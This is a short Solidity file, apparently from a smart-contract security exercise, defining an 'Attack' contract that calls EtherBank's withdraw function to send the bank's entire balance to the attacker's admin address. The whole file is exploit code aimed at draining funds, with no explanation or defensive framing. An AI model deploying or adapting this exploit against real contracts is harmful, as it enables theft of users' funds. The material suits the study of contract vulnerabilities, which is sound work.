// SPDX-License-Identifier:MIT
pragma solidity ^0.8.9;

import "./EtherBank.sol";

contract Attack {
    address private admin;
    EtherBank public etherbank;

    constructor(address _etherbank){
        etherbank = EtherBank(_etherbank);
        admin = msg.sender;
    } 

    function attack() public payable{
        etherbank.withdraw(admin,address(etherbank).balance);
    }
}
